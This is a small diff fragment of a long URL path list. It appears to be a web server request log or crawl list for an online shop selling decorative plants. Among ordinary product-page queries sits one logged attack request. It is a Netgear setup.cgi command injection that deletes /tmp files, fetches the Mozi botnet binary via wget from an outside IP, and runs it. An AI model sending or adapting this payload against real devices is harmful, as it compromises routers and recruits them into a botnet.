@@ -24760,3 +24760,4 @@ http://142.250.203.142/
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.231.104.101:37699/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /figs-loso-gold-figs-30-50-cm?order=DESC&page=4&sort=pd.name&tag=30
 /figs-loso-gold-figs-30-50-cm?order=DESC&page=2&sort=p.price&tag=5
+/system/storage/logs/globalpay_remote.log
